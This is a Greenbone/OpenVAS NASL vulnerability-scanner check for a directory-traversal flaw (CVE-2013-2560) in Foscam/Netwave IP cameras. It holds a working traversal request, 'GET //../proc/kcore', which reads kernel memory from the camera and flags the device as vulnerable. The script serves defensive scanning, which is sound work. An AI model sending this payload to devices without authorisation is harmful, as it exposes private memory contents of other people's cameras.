# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103679");
  script_cve_id("CVE-2013-2560");
  script_version("2022-07-22T10:11:18+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-07-22 10:11:18 +0000 (Fri, 22 Jul 2022)");
  script_tag(name:"creation_date", value:"2013-03-15 12:24:18 +0100 (Fri, 15 Mar 2013)");
  script_name("Foscam < 11.37.2.49 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Netwave_IP_Camera/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58290");

  script_tag(name:"summary", value:"Foscam is prone to a directory-traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Remote attackers can use specially crafted requests with
  directory-traversal sequences ('../') to retrieve arbitrary files in the context of the
  application. This may aid in further attacks.");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor
  advisory for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Netwave IP Camera" >!< banner)
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

send(socket:soc, data: string("GET //../proc/kcore HTTP/1.0\r\n\r\n"));
recv = recv(socket:soc, length:500);

close(soc);

if(recv && "ELF" >< recv && "CORE" >< recv) {
  security_message(port:port);
  exit(0);
}

exit(99);
